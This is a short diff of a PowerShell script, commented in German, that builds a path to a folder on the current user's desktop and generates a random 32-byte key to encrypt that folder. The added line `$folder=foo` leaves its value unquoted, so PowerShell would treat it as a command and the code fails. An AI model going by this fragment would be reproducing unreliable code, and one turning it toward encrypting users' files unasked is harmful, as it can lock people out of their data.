@@ -1,5 +1,7 @@
 #wir stellen erstmal fest, welches Folder wir verschlüsseln..
-$folderPath = "C:\Users\username\Desktop\folder"
+$username=$env:USERNAME
+$folder=foo
+$folderPath = "C:\Users\$username\Desktop\$folder"
 $encryptionKey = New-Object Byte[] 32  
 [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($encryptionKey)
 
